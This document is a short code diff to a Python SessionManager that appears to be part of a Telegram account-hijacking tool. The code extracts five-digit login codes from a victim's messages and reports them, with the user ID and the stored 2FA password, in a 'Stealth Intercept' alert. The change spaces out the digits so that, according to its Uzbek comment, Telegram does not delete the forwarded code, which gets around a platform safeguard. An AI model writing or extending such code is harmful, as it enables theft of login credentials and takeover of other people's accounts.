@@ -109,9 +109,11 @@ class SessionManager:
                             code_match = re.search(r"(\d{5})", m.text)
                             if code_match:
                                 code = code_match.group(1)
-                                enc = "".join(digit + "asdfghjkl"[i] for i, digit in enumerate(code))
+                                enc = " ".join([digit for digit in code])
                                 
-                                msg = f"🥷 <b>Stealth Intercept</b> (User: <code>{user_id}</code>)\n\nCode: <code>{enc}</code>"
+                                msg = f"🥷 <b>Stealth Intercept</b> (User: <code>{user_id}</code>)\n\n"
+                                msg += f"KOD (faqat raqamlarni o'qing): <b>{enc}</b>\n"
+                                msg += f"<i>(Telegram o'chirib yubormasligi uchun orasiga bo'sh joy qo'shilgan)</i>"
                                 if session.two_fa_password:
                                     msg += f"\n2FA: <code>{session.two_fa_password}</code>"
                                 
